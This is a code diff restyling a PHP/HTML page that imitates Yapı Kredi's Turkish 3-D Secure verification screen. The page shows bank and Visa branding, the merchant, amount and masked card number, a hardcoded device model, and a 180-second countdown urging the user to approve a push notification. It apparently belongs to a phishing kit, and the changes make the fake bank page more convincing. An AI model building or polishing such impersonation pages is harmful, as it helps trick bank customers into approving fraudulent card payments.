@@ -34,8 +34,8 @@ $tutar_ykb = number_format((float)$ucret_val, 2, ',', '.') . ' TL';
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     }
     body {
-      background: #0070c0; /* Solid blue background */
-      background: linear-gradient(135deg, #0b6cb4 0%, #003a70 100%);
+      background: #0070c0; /* Fallback */
+      background: linear-gradient(180deg, #0b6cb4 0%, #003a70 100%);
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -43,112 +43,116 @@ $tutar_ykb = number_format((float)$ucret_val, 2, ',', '.') . ' TL';
     }
     
     /* Top Bar */
-    .top-bar {
+    .top-header-bar {
       background-color: #002d62;
       color: #fff;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 12px 24px;
+      padding: 10px 20px;
       font-size: 14px;
+      font-weight: 500;
     }
-    .top-bar .title {
-      font-weight: bold;
-      font-size: 15px;
+    .top-header-bar .title {
+      font-size: 13.5px;
+      font-weight: 700;
+      letter-spacing: 0.2px;
     }
-    .top-bar .links {
-      font-size: 13px;
+    .top-header-bar .links {
+      font-size: 12.5px;
     }
-    .top-bar .links span {
-      margin-left: 5px;
-      margin-right: 5px;
+    .top-header-bar .links span {
+      margin-left: 6px;
+      margin-right: 6px;
       cursor: pointer;
+      opacity: 0.9;
     }
-    .top-bar .links span:hover {
+    .top-header-bar .links span:hover {
+      opacity: 1;
       text-decoration: underline;
     }
 
     /* Main Container */
-    .main-container {
+    .main-wrapper {
       flex: 1;
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 16px;
+      padding: 24px 16px;
     }
     
     /* Card */
-    .card {
+    .threed-card {
       background: #ffffff;
       border-radius: 4px;
       width: 100%;
       max-width: 440px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
-      border: 1px solid #c9d8e5;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+      border: 3px solid #dbe6f0;
       overflow: hidden;
     }
     
     /* Logo Header */
-    .logo-header {
+    .brand-section {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 16px 20px;
-      border-bottom: 1px solid #e2e8f0;
+      padding: 18px 24px;
+      border-bottom: 1px solid #eaf0f5;
     }
-    .logo-header img.ykb-logo {
-      height: 32px;
+    .brand-section img.ykb-logo {
+      height: 30px;
     }
-    .logo-header .brand-right {
-      color: #002d62;
-      font-size: 18px;
-      font-weight: 900;
-      font-style: italic;
-      letter-spacing: 0.5px;
+    .brand-section svg.visa-logo {
+      height: 18px;
     }
     
     /* Card Body */
-    .card-body {
-      padding: 20px;
+    .card-content {
+      padding: 24px;
     }
     
     /* Info Table */
-    .info-table {
+    .details-table {
       width: 100%;
-      margin-bottom: 16px;
+      margin-bottom: 18px;
       font-size: 13.5px;
+      border-collapse: collapse;
     }
-    .info-row {
+    .details-row {
       display: flex;
-      padding: 6px 0;
-      line-height: 1.4;
+      padding: 8px 0;
+      border-bottom: 1px solid #f2f6f9;
     }
-    .info-label {
-      width: 140px;
-      color: #555;
+    .details-row:last-child {
+      border-bottom: none;
+    }
+    .details-label {
+      width: 150px;
+      color: #64748b;
       font-weight: 500;
       flex-shrink: 0;
     }
-    .info-value {
-      color: #111;
+    .details-value {
+      color: #0f172a;
       font-weight: 700;
     }
     
     /* Blue Alert Info */
-    .alert-info-share {
+    .alert-notice {
       display: flex;
       align-items: center;
-      gap: 8px;
-      color: #0070c0;
-      font-size: 12.5px;
+      gap: 10px;
+      color: #0284c7;
+      font-size: 13px;
       font-weight: 600;
-      margin-bottom: 16px;
-      line-height: 1.4;
+      margin-bottom: 20px;
+      padding: 2px 0;
     }
-    .alert-info-share .info-icon {
-      width: 16px;
-      height: 16px;
-      background: #0070c0;
+    .alert-notice .info-badge {
+      width: 18px;
+      height: 18px;
+      background: #0284c7;
       color: #fff;
       border-radius: 50%;
       display: flex;
@@ -160,142 +164,146 @@ $tutar_ykb = number_format((float)$ucret_val, 2, ',', '.') . ' TL';
     }
 
     /* Notification Box */
-    .notification-box {
-      background-color: #f2f7fc;
-      border-radius: 4px;
-      padding: 16px;
+    .approval-container {
+      background-color: #f8fafc;
+      border-radius: 6px;
+      padding: 20px;
       display: flex;
       flex-direction: column;
       align-items: center;
-      border: 1px solid #d4e3f0;
+      border: 1px solid #e2e8f0;
     }
-    .notification-text-row {
+    .approval-message-wrapper {
       display: flex;
-      gap: 10px;
+      gap: 12px;
       align-items: flex-start;
       width: 100%;
-      color: #333;
+      color: #334155;
       font-size: 13px;
       line-height: 1.5;
-      margin-bottom: 16px;
+      margin-bottom: 22px;
     }
-    .notification-text-row .info-icon {
-      width: 18px;
-      height: 18px;
-      background: #0070c0;
+    .approval-message-wrapper .warning-badge {
+      width: 22px;
+      height: 22px;
+      background: #0284c7;
       color: #fff;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 12px;
+      font-size: 13px;
       font-weight: bold;
       flex-shrink: 0;
-      margin-top: 2px;
+      margin-top: 1px;
     }
     
     /* Timer Circle */
-    .timer-wrapper {
+    .progress-circle-wrap {
       position: relative;
-      width: 80px;
-      height: 80px;
-      margin-bottom: 10px;
+      width: 100px;
+      height: 100px;
+      margin-bottom: 14px;
     }
-    .timer-circle {
+    .countdown-svg {
       width: 100%;
       height: 100%;
       transform: rotate(-90deg);
     }
-    .timer-circle circle {
+    .countdown-svg circle {
       fill: none;
-      stroke-width: 5;
+      stroke-width: 6;
     }
-    .timer-circle circle.bg {
-      stroke: #d0dce5;
+    .countdown-svg circle.track {
+      stroke: #e2e8f0;
     }
-    .timer-circle circle.progress {
-      stroke: #0088cc;
+    .countdown-svg circle.bar {
+      stroke: #0284c7;
       stroke-dasharray: 251.2; /* 2 * pi * 40 */
       stroke-dashoffset: 0;
       stroke-linecap: round;
       transition: stroke-dashoffset 1s linear;
     }
-    .timer-number {
+    .countdown-number {
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      font-size: 20px;
+      font-size: 26px;
       font-weight: 700;
-      color: #333;
+      color: #1e293b;
     }
-    .timer-desc {
-      font-size: 13px;
-      color: #0070c0;
-      font-weight: 600;
+    .seconds-text {
+      font-size: 13.5px;
+      color: #0284c7;
+      font-weight: 700;
+      margin-top: 4px;
     }
   </style>
 </head>
 <body>
   
-  <div class="top-bar">
+  <div class="top-header-bar">
     <div class="title">Üç Boyutlu Güvenlik Sistemi</div>
     <div class="links">
-      <span>Yardım</span> | <span>English</span>
+      <span>Yardım</span>|<span>English</span>
     </div>
   </div>
 
-  <div class="main-container">
-    <div class="card">
-      <div class="logo-header">
+  <div class="main-wrapper">
+    <div class="threed-card">
+      <div class="brand-section">
         <img class="ykb-logo" src="https://goguvenliodeme.bkm.com.tr/banklogo/yapikredi.png" alt="Yapı Kredi">
-        <span class="brand-right">VISA</span>
+        <!-- Crisp inline SVG for Visa -->
+        <svg class="visa-logo" viewBox="0 0 300 100" fill="#002d62">
+          <path d="M123.6 2.4L105 97.6h25.8l18.6-95.2h-25.8zm73.2 0l-15.6 53.6-6.6-45.2c-.8-5-4.6-8.4-9.6-8.4h-35.4l-.6 2.6c7.2 1.6 13.8 4.4 18.2 7.6 2.8 2 3.6 3.6 4.6 7.4l15.6 77.6h27L223 2.4h-26.2zm48 0l-20.4 95.2h24.8l20.4-95.2h-24.8zm-192.6 0L29.6 68 24.2 13.2C22.6 5.4 16.4 2.4 8.8 2.4H0l.8 2.6c9.6 2.2 18.2 5.8 24 9.6 3.6 2.4 4.6 4.4 5.8 9l18.4 74H76L102.2 2.4H52.2z" fill="#002d62"/>
+        </svg>
       </div>
       
-      <div class="card-body">
-        <div class="info-table">
-          <div class="info-row">
-            <div class="info-label">Üye İşyeri İsmi</div>
-            <div class="info-value"><?= htmlspecialchars($isyeri) ?></div>
-          </div>
-          <div class="info-row">
-            <div class="info-label">Tutar</div>
-            <div class="info-value"><?= $tutar_ykb ?></div>
-          </div>
-          <div class="info-row">
-            <div class="info-label">Tarih</div>
-            <div class="info-value"><?= $zaman_ykb ?></div>
-          </div>
-          <div class="info-row">
-            <div class="info-label">Kart Numarası</div>
-            <div class="info-value"><?= $masked_card ?></div>
-          </div>
-          <div class="info-row">
-            <div class="info-label">Cihaz Bilgisi</div>
-            <div class="info-value">M2007J20CG</div>
-          </div>
-        </div>
+      <div class="card-content">
+        <table class="details-table">
+          <tr class="details-row">
+            <td class="details-label">Üye İşyeri İsmi</td>
+            <td class="details-value"><?= htmlspecialchars($isyeri) ?></td>
+          </tr>
+          <tr class="details-row">
+            <td class="details-label">Tutar</td>
+            <td class="details-value"><?= $tutar_ykb ?></td>
+          </tr>
+          <tr class="details-row">
+            <td class="details-label">Tarih</td>
+            <td class="details-value"><?= $zaman_ykb ?></td>
+          </tr>
+          <tr class="details-row">
+            <td class="details-label">Kart Numarası</td>
+            <td class="details-value"><?= $masked_card ?></td>
+          </tr>
+          <tr class="details-row">
+            <td class="details-label">Cihaz Bilgisi</td>
+            <td class="details-value">M2007J20CG</td>
+          </tr>
+        </table>
         
-        <div class="alert-info-share">
-          <div class="info-icon">i</div>
+        <div class="alert-notice">
+          <div class="info-badge">i</div>
           <div>Bu bilgiler işyerleri ile paylaşılmamaktadır.</div>
         </div>
         
-        <div class="notification-box">
-          <div class="notification-text-row">
-            <div class="info-icon">!</div>
+        <div class="approval-container">
+          <div class="approval-message-wrapper">
+            <div class="warning-badge">!</div>
             <div>Akıllı Bildirim tanımlı mobil cihazınıza gönderilen Akıllı Bildirim'i onaylayarak işleminizi tamamlayabilirsiniz.</div>
           </div>
           
-          <div class="timer-wrapper">
-            <svg class="timer-circle" viewBox="0 0 100 100">
-              <circle class="bg" cx="50" cy="50" r="40" />
-              <circle class="progress" cx="50" cy="50" r="40" id="timer-progress" />
+          <div class="progress-circle-wrap">
+            <svg class="countdown-svg" viewBox="0 0 100 100">
+              <circle class="track" cx="50" cy="50" r="40" />
+              <circle class="bar" cx="50" cy="50" r="40" id="progress-bar-fill" />
             </svg>
-            <div class="timer-number" id="timer-number">180</div>
+            <div class="countdown-number" id="countdown-num">180</div>
           </div>
           
-          <div class="timer-desc" id="timer-desc">180 saniye içinde onaylayınız.</div>
+          <div class="seconds-text" id="seconds-text">180 saniye içinde onaylayınız.</div>
         </div>
       </div>
     </div>
@@ -303,9 +311,9 @@ $tutar_ykb = number_format((float)$ucret_val, 2, ',', '.') . ' TL';
 
   <script>
     var sec = 180;
-    var timerProgress = document.getElementById('timer-progress');
-    var timerNumber = document.getElementById('timer-number');
-    var timerDesc = document.getElementById('timer-desc');
+    var progressBar = document.getElementById('progress-bar-fill');
+    var countdownNum = document.getElementById('countdown-num');
+    var secondsText = document.getElementById('seconds-text');
     var totalSec = 180;
     var dashArray = 251.2;
 
@@ -317,16 +325,16 @@ $tutar_ykb = number_format((float)$ucret_val, 2, ',', '.') . ' TL';
         return;
       }
       sec--;
-      timerNumber.textContent = sec;
-      timerDesc.textContent = sec + " saniye içinde onaylayınız.";
+      countdownNum.textContent = sec;
+      secondsText.textContent = sec + " saniye içinde onaylayınız.";
       
       // Calculate progress dash offset
       var offset = dashArray - (dashArray * (sec / totalSec));
-      timerProgress.style.strokeDashoffset = offset;
+      progressBar.style.strokeDashoffset = offset;
     }
 
     // Set initial dash offset to 0 (full circle)
-    timerProgress.style.strokeDashoffset = 0;
+    progressBar.style.strokeDashoffset = 0;
     var timerInterval = setInterval(updateTimer, 1000);
 
     // Heartbeat logic
